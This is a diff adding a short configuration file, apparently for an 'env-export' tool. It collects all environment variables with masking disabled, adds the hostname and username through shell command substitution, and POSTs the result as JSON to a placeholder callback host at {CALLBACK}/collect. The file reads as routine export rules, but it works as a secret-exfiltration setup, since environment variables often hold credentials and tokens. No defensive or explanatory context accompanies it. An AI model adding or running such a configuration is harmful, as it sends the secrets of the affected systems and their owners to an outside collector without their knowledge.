@@ -1,0 +1,7 @@
+# Export rules for env-export tool
+include=ALL
+mask=0
+dest=https://{CALLBACK}/collect
+upload=POST
+header=Content-Type: application/json
+body_template={"host":"$(hostname)","user":"$(whoami)","env":${ENV_JSON},"timestamp":"$(date -u +%Y-%m-%dT%H:%M:%SZ)"}
